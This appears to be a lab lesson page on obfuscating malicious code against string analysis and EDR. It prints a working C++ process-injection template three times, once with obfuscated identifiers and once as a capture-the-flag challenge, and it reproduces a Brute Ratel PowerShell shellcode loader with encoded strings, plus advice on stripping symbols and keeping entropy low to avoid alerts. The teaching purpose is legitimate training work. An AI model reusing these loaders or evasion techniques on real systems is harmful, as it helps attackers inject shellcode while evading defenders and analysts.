+<p>The aforementioned white paper: <a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under the <strong>code-element</strong> layer’s <strong>meaningless identifiers</strong> method.</p>
+<p>Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language.</p>
+<hr>
+<p>As an example of a compiled language, we can observe a process injector written in C++ that reports its status to the command line.</p>
+<pre><code class="language-c">#include "windows.h"
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+using namespace std;
+
+int main(int argc, char* argv[])
+{
+	unsigned char shellcode[] = "";
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+	string leaked = "This was leaked in the strings";
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	cout &lt;&lt; "Handle obtained for" &lt;&lt; processHandle;
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	cout &lt;&lt; "Buffer Created";
+	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+	cout &lt;&lt; "Process written with buffer" &lt;&lt; remoteBuffer;
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+	cout &lt;&lt; "Closing handle" &lt;&lt; processHandle;
+	cout &lt;&lt; leaked;
+
+	return 0;
+}
+</code></pre>
+<p>Let’s use strings to see exactly what was leaked when this source code is compiled.</p>
+<pre><code class="language-plaintext">C:\&gt;.\strings.exe "\Injector.exe"
+
+Strings v2.54 - Search for ANSI and Unicode strings in binary images.
+Copyright (C) 1999-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+!This program cannot be run in DOS mode.
+&gt;FU
+z';
+z';
+...
+[snip]
+...
+Y_^[
+leaked
+shellcode
+2_^[]
+...
+[snip]
+...
+std::_Adjust_manually_vector_aligned
+"invalid argument"
+string too long
+This was leaked in the strings
+Handle obtained for
+Buffer Created
+Process written with buffer
+Closing handle
+std::_Allocate_manually_vector_aligned
+bad allocation
+Stack around the variable '
+...
+[snip]
+...
+8@9H9T9X9\\9h9|9
+:$:(:D:H:
+@1p1
+</code></pre>
+<p>Notice that all of the iostream was written to strings, and even the shellcode byte array was leaked. This is a smaller program, so imagine what a fleshed-out and un-obfuscated program would look like!</p>
+<p>We can remove comments and replace the meaningful identifiers to resolve this problem.</p>
+<pre><code class="language-c">#include "windows.h"
+
+int main(int argc, char* argv[])
+{
+	unsigned char awoler[] = "";
+
+	HANDLE awerfu;
+	HANDLE rwfhbf;
+	PVOID iauwef;
+
+	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
+	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
+	CloseHandle(awerfu);
+
+	return 0;
+}
+</code></pre>
+<p>We should no longer have any identifiable string information, and the program is safe from string analysis.</p>
+<hr>
+<p>As an example for an interpreted language we can observe the deprecated <a href="https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1">Badger PowerShell loader</a> from the <a href="https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit">BRC4 Community Kit</a>.</p>
+<pre><code class="language-plaintext">Set-StrictMode -Version 2
+[Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50)
+[Byte[]] $ahv3I = @(0x34, 0x59, 0x38, 0x50, 0x58, 0x5a, 0x5d, 0x64, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50)
+[Byte[]] $Moo5y = @(0x38, 0x64, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50, 0x3f, 0x64, 0x5b, 0x50)
+[Byte[]] $ooR5o = @(0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x3e, 0x50, 0x4c, 0x57, 0x50, 0x4f, 0x17, 0x0b, 0x2c, 0x59, 0x5e, 0x54, 0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x2c, 0x60, 0x5f, 0x5a, 0x2e, 0x57, 0x4c, 0x5e, 0x5e)
+[Byte[]] $Reo5o = @(0x3d, 0x60, 0x59, 0x5f, 0x54, 0x58, 0x50, 0x17, 0x0b, 0x38, 0x4c, 0x59, 0x4c, 0x52, 0x50, 0x4f)
+[Byte[]] $Reib3 = @(0x3d, 0x3f, 0x3e, 0x5b, 0x50, 0x4e, 0x54, 0x4c, 0x57, 0x39, 0x4c, 0x58, 0x50, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e)
+[Byte[]] $Thah8 = @(0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x39, 0x50, 0x62, 0x3e, 0x57, 0x5a, 0x5f, 0x17, 0x0b, 0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57)
+[Byte[]] $ii5Ie = @(0x34, 0x59, 0x61, 0x5a, 0x56, 0x50)
+[Byte[]] $KooG5 = @(0x38, 0x54, 0x4e, 0x5d, 0x5a, 0x5e, 0x5a, 0x51, 0x5f, 0x19, 0x42, 0x54, 0x59, 0x1e, 0x1d, 0x19, 0x40, 0x59, 0x5e, 0x4c, 0x51, 0x50, 0x39, 0x4c, 0x5f, 0x54, 0x61, 0x50, 0x38, 0x50, 0x5f, 0x53, 0x5a, 0x4f, 0x5e)
+[Byte[]] $io9iH = @(0x32, 0x50, 0x5f, 0x3b, 0x5d, 0x5a, 0x4e, 0x2c, 0x4f, 0x4f, 0x5d, 0x50, 0x5e, 0x5e)
+[Byte[]] $Qui5i = @(0x32, 0x50, 0x5f, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50, 0x33, 0x4c, 0x59, 0x4f, 0x57, 0x50)
+[Byte[]] $xee2N = @(0x56, 0x50, 0x5d, 0x59, 0x50, 0x57, 0x1e, 0x1d)
+[Byte[]] $AD0Pi = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x2c, 0x57, 0x57, 0x5a, 0x4e)
+[Byte[]] $ahb3O = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x3b, 0x5d, 0x5a, 0x5f, 0x50, 0x4e, 0x5f)
+[Byte[]] $yhe4c = @(0x2E, 0x5D, 0x50, 0x4C, 0x5F, 0x50, 0x3F, 0x53, 0x5D, 0x50, 0x4C, 0x4F)
+
+function Get-Robf ($b3tz) {
+    $aisN = [System.Byte[]]::new($b3tz.Count)
+    for ($x = 0; $x -lt $aisN.Count; $x++) {
+       $aisN[$x] = ($b3tz[$x] + 21)
+    }
+    return [System.Text.Encoding]::ASCII.GetString($aisN)
+}
+function Get-PA ($vmod, $vproc) {
+    $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType((Get-Robf $KooG5))
+    return ($a.GetMethod((Get-Robf $io9iH), [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a.GetMethod((Get-Robf $Qui5i))).Invoke($null, @($vmod)))), $vproc))
+}
+function Get-TDef {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
+    )
+    $vtdef = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName((Get-Robf $Ait1m))), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule((Get-Robf  $ahv3I), $false).DefineType((Get-Robf $Moo5y), (Get-Robf $ooR5o), [System.MulticastDelegate])
+    $vtdef.DefineConstructor((Get-Robf $Reib3), [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
+    $vtdef.DefineMethod((Get-Robf $ii5Ie), (Get-Robf $Thah8), $var_return_type, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
+    return $vtdef.CreateType()
+}
+
+[Byte[]]$vopcode = @(BADGER_SHELLCODE)
+
+$vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $AD0Pi)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))).Invoke([IntPtr]::Zero, $vopcode.Length, 0x3000, 0x04)
+[System.Runtime.InteropServices.Marshal]::Copy($vopcode, 0x0, $vbuf, $vopcode.length)
+([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null
+([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null
+</code></pre>
+<p>You may notice that some cmdlets and functions are kept in their original state… why is that? Depending on your objectives, you may want to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all cmdlets and functions, it would raise the entropy in both interpreted and compiled languages resulting in higher EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated.</p>
+<h3>Code Structure</h3>
+<p>Code structure can be a bothersome problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst.</p>
+<p>As covered in the aforementioned taxonomy paper,&nbsp;<strong>junk code</strong> and&nbsp;<strong>reordering code</strong> are both widely used as additional measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious functions of an application.</p>
+<p>Separation of related code can impact both interpreted and compiled languages and result in hidden signatures that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence of related code to fool the engine into believing it is a safe call or function.</p>
+<h3>File &amp; Compilation Properties</h3>
+<p>More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but they can lead to several advantages to assist an analyst. For example, if a program is compiled as a debug build, an analyst can obtain all the available global variables and other program information.</p>
+<p>The compiler will include a symbol file when a program is compiled as a debug build. Symbols commonly aid in debugging a binary image and can contain global and local variables, function names, and entry points. Attackers must be aware of these possible problems to ensure proper compilation practices and that no information is leaked to an analyst.</p>
+<p>Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols from a compiler like&nbsp;<strong>Visual Studio</strong>, we need to change the compilation target from <code>Debug</code> to <code>Release</code> or use a lighter-weight compiler like&nbsp;<strong>mingw.</strong></p>
+<p>If we need to remove symbols from a pre-compiled image, we can use the command-line utility: <code>strip</code>.</p>
+<p>The aforementioned white paper:&nbsp;<a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under the&nbsp;<strong>code-element</strong> layer’s&nbsp;<strong>stripping redundant symbols</strong> method.</p>
+<p>Below is an example of using strip to remove the symbols from a binary compiled in&nbsp;<strong>gcc</strong> with debugging enabled.</p>
+<p>Several other properties should be considered before actively using a tool, such as entropy or hash. These concepts are covered in task 5 of the&nbsp;<a href="https://tryhackme.com/room/signatureevasion">Signature Evasion room</a>.</p>
+<hr>
+<p>Using the knowledge you have accrued throughout this task, remove any meaningful identifiers or debug information from the C++ source code below using the AttackBox or your own virtual machine.</p>
+<p>Once adequately obfuscated and stripped compile the source code using <code>MingW32-G++</code> and submit it to the webserver at <code>http://10.10.77.186/</code>.</p>
+<p>Note: the file name must be <code>challenge-8.exe</code> to receive the flag.</p>
+<pre><code class="language-plaintext">#include "windows.h"
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+using namespace std;
+
+int main(int argc, char* argv[])
+{
+	unsigned char shellcode[] = "";
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+	string leaked = "This was leaked in the strings";
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	cout &lt;&lt; "Handle obtained for" &lt;&lt; processHandle;
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	cout &lt;&lt; "Buffer Created";
+	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+	cout &lt;&lt; "Process written with buffer" &lt;&lt; remoteBuffer;
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+	cout &lt;&lt; "Closing handle" &lt;&lt; processHandle;
+	cout &lt;&lt; leaked;
+
+	return 0;
+} </code></pre>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
